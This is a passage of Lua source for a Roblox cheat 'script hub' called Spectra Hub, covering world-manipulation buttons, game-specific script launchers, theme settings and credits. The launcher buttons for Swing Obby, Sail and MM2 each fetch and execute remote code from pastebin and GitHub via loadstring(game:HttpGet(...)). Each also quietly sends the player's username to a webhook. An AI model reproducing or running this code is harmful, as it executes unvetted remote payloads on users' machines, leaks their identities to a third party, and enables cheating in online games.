Slider(tabWorld.page,"Gravity",0,500,196,function(v) workspace.Gravity=v end,tabWorld)
local function gravBtn(l,g) Button(tabWorld.page,l,function() workspace.Gravity=g; Notify("Gravity",l.."!") end,tabWorld) end
gravBtn("Low Gravity",30); gravBtn("Normal Gravity",196); gravBtn("High Gravity",400); gravBtn("Zero Gravity",0)
Section(tabWorld.page,"WORLD")
Button(tabWorld.page,"Delete All NPCs",function() local c=0; for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Model") and v~=LocalPlayer.Character and v:FindFirstChildOfClass("Humanoid") then v:Destroy(); c=c+1 end end; Notify("World",c.." NPCs deleted!","success") end,tabWorld)
Button(tabWorld.page,"List Players",function() local n={}; for _,v in pairs(Players:GetPlayers()) do table.insert(n,v.Name) end; Notify("Players",table.concat(n,", ")) end,tabWorld)

-- ── SWING OBBY ───────────────────────────────────────────
local function makeBanner(page,emoji,title,sub,bg1,bg2,tc)
	local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0,80); f.BackgroundColor3=bg1; f.BorderSizePixel=0; f.Parent=page
	Instance.new("UICorner",f).CornerRadius=UDim.new(0,10)
	local g=Instance.new("UIGradient"); g.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,bg1),ColorSequenceKeypoint.new(1,bg2)}); g.Rotation=135; g.Parent=f
	local ic=Instance.new("TextLabel"); ic.Text=emoji; ic.Size=UDim2.new(0,40,1,0); ic.Position=UDim2.new(0,10,0,0); ic.BackgroundTransparency=1; ic.TextColor3=tc; ic.Font=Enum.Font.GothamBold; ic.TextSize=26; ic.Parent=f
	local tl=Instance.new("TextLabel"); tl.Text=title; tl.Size=UDim2.new(1,-58,0,24); tl.Position=UDim2.new(0,54,0.15,0); tl.BackgroundTransparency=1; tl.TextColor3=Color3.fromRGB(255,255,255); tl.Font=Enum.Font.GothamBold; tl.TextSize=TS; tl.TextXAlignment=Enum.TextXAlignment.Left; tl.Parent=f
	local sl=Instance.new("TextLabel"); sl.Text=sub; sl.Size=UDim2.new(1,-58,0,16); sl.Position=UDim2.new(0,54,0.6,0); sl.BackgroundTransparency=1; sl.TextColor3=tc; sl.Font=Enum.Font.Gotham; sl.TextSize=TS_SM; sl.TextXAlignment=Enum.TextXAlignment.Left; sl.Parent=f
end
makeBanner(tabSwing.page,"🎮","Swing Obby for Brainrots!","Game-specific scripts",Color3.fromRGB(10,6,26),Color3.fromRGB(28,12,65),Color3.fromRGB(200,175,255))
Section(tabSwing.page,"SCRIPTS")
Button(tabSwing.page,"▶ Execute Swing Obby Script",function() Notify("Swing Obby","Loading...","warn"); sendWebhook("🎮 Script Executed","**Script:** Swing Obby\n**User:** "..LocalPlayer.Name,16776960); task.spawn(function() pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/Nfgmttau"))() end); Notify("Swing Obby","Executed!","success") end) end,tabSwing)

-- ── SAIL OBBY ────────────────────────────────────────────
makeBanner(tabSail.page,"⛵","Sail For Brainrots!","Game-specific scripts",Color3.fromRGB(4,12,26),Color3.fromRGB(5,25,60),Color3.fromRGB(130,210,255))
Section(tabSail.page,"SCRIPTS")
Button(tabSail.page,"▶ Execute Sail Script",function() Notify("Sail For Brainrots","Loading...","warn"); sendWebhook("⛵ Script Executed","**Script:** Sail For Brainrots\n**User:** "..LocalPlayer.Name,3447003); task.spawn(function() pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/9cVqBkXq"))() end); Notify("Sail For Brainrots","Executed!","success") end) end,tabSail)

-- ── MM2 ──────────────────────────────────────────────────
makeBanner(tabMM2.page,"🔪","Murder Mystery 2","Game-specific scripts",Color3.fromRGB(14,4,4),Color3.fromRGB(60,8,8),Color3.fromRGB(255,120,120))
Section(tabMM2.page,"SCRIPTS")
Button(tabMM2.page,"▶ Execute MM2 Script",function() Notify("Murder Mystery 2","Loading...","warn"); sendWebhook("🔪 Script Executed","**Script:** MM2\n**User:** "..LocalPlayer.Name,15548997); task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Kuploit/MM2/refs/heads/main/Script"))() end); Notify("MM2","Executed!","success") end) end,tabMM2)

-- ── SETTINGS ─────────────────────────────────────────────
Section(tabSettings.page,"THEMES")
local themeOrder={"🤍 Spectra","⚡ Volt","🔥 Ember","🌊 Cyan","🌿 Neon Green","🌸 Pink","🌙 Ghost"}
for _,tName in ipairs(themeOrder) do
	local td=THEMES[tName]
	local card=Instance.new("Frame"); card.Size=UDim2.new(1,0,0,isMobile and 44 or 54); card.BackgroundColor3=td.BG_ITEM; card.BorderSizePixel=0; card.Parent=tabSettings.page
	Instance.new("UICorner",card).CornerRadius=UDim.new(0,10)
	local cStroke=Instance.new("UIStroke"); cStroke.Color=td.STROKE; cStroke.Thickness=1.5; cStroke.Parent=card
	local sw={td.ACCENT,td.ACCENT2,td.BG_PANEL,td.STROKE}
	for i,col in ipairs(sw) do local s=Instance.new("Frame"); s.Size=UDim2.new(0,12,0,12); s.Position=UDim2.new(0,8+(i-1)*17,0.5,-6); s.BackgroundColor3=col; s.BorderSizePixel=0; s.Parent=card; Instance.new("UICorner",s).CornerRadius=UDim.new(1,0) end
	local nl=Instance.new("TextLabel"); nl.Text=tName; nl.Size=UDim2.new(0.45,0,1,0); nl.Position=UDim2.new(0,88,0,0); nl.BackgroundTransparency=1; nl.TextColor3=td.TEXT; nl.Font=Enum.Font.GothamBold; nl.TextSize=TS; nl.TextXAlignment=Enum.TextXAlignment.Left; nl.Parent=card
	local apB=Instance.new("TextButton"); apB.Text="Apply"; apB.Size=UDim2.new(0,58,0,isMobile and 26 or 28); apB.Position=UDim2.new(1,-64,0.5,-13); apB.BackgroundColor3=td.ACCENT; apB.TextColor3=td.BTN_TEXT; apB.Font=Enum.Font.GothamBold; apB.TextSize=TS; apB.BorderSizePixel=0; apB.Parent=card
	Instance.new("UICorner",apB).CornerRadius=UDim.new(0,7)
	local cap=tName
	apB.MouseButton1Click:Connect(function()
		THEME=copyTheme(THEMES[cap]); applyTheme()
		ALGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,THEME.ACCENT),ColorSequenceKeypoint.new(0.5,THEME.ACCENT2),ColorSequenceKeypoint.new(1,THEME.ACCENT)})
		for _,t in pairs(tabs) do
			if t==activeTab then tween(t.btn,{BackgroundColor3=THEME.ACCENT_DIM,BackgroundTransparency=0},0.2); tween(t.nameLbl,{TextColor3=THEME.WHITE},0.2); tween(t.iconLbl,{TextColor3=THEME.ACCENT},0.2)
			else tween(t.btn,{BackgroundColor3=THEME.BG_PANEL,BackgroundTransparency=0.2},0.2); tween(t.nameLbl,{TextColor3=THEME.TEXT_DIM},0.2); tween(t.iconLbl,{TextColor3=THEME.TEXT_DIM},0.2) end
		end
		Notify("Theme",cap.." applied!","success")
	end)
end
Section(tabSettings.page,"OPACITY")
Slider(tabSettings.page,"Hub Opacity",20,100,100,function(v) MainFrame.BackgroundTransparency=math.clamp(1-(v/100)*0.92,0.08,1) end,tabSettings)

-- ── CREDITS ──────────────────────────────────────────────
Section(tabCredits.page,"ABOUT")
local credCard=Instance.new("Frame"); credCard.Size=UDim2.new(1,0,0,70); credCard.BackgroundColor3=THEME.BG_ITEM; credCard.BorderSizePixel=0; credCard.Parent=tabCredits.page
Instance.new("UICorner",credCard).CornerRadius=UDim.new(0,10)
local credStroke=Instance.new("UIStroke"); credStroke.Color=THEME.STROKE; credStroke.Thickness=1; credStroke.Parent=credCard
local ct=Instance.new("TextLabel"); ct.Text="SPECTRA HUB  v3.0"; ct.Size=UDim2.new(1,-16,0,24); ct.Position=UDim2.new(0,10,0,8); ct.BackgroundTransparency=1; ct.TextColor3=THEME.WHITE; ct.Font=Enum.Font.GothamBold; ct.TextSize=TS_LG; ct.TextXAlignment=Enum.TextXAlignment.Left; ct.Parent=credCard
local cs2=Instance.new("TextLabel"); cs2.Text="Ultra Modern Script Hub — by Ynitsis"; cs2.Size=UDim2.new(1,-16,0,18); cs2.Position=UDim2.new(0,10,0,34); cs2.BackgroundTransparency=1; cs2.TextColor3=THEME.TEXT_DIM; cs2.Font=Enum.Font.Gotham; cs2.TextSize=TS_SM; cs2.TextXAlignment=Enum.TextXAlignment.Left; cs2.Parent=credCard

-- ═══════════════════════════════════════════
--  AUTO-SELECT FIRST TAB
-- ═══════════════════════════════════════════

tabUniversal.page.Visible=true; tabUniversal.pill.Visible=true
tween(tabUniversal.btn,{BackgroundTransparency=0,BackgroundColor3=THEME.ACCENT_DIM},0.2)
tween(tabUniversal.nameLbl,{TextColor3=THEME.WHITE},0.2)
tween(tabUniversal.iconLbl,{TextColor3=THEME.ACCENT},0.2)
activeTab=tabUniversal

Notify("Spectra Hub","v3.0 loaded! "..#allElements.." features ready.","success")
